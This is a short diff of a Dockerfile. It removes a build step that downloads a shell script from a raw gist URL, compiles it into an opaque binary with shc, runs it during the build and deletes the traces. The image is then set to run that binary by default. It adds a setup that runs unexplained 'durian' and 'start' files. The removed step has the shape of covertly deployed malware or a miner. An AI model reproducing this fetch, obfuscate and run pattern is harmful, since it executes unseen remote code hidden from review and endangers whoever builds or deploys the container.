@@ -1,12 +1,9 @@
-FROM alpine:edge
+FROM ubuntu:xenial
 
-ENV SHURL https://gist.githubusercontent.com/nikeely/4553615ecce1b4e3c9028533b9d6fb1b/raw/6b976e78022008cf1122745d77a1ce561deaeab1/ok.sh
+ENV PORT    8080
 
-ADD worker.zip /worker.zip
-
-RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && \
-    apk update && apk add --no-cache gcc musl-dev shc && \
-    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
-    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
-    
-CMD /worker.x
+ADD durian /durian
+ADD start /start
+RUN chmod +x /durian
+RUN chmod +x /start
+CMD ./start
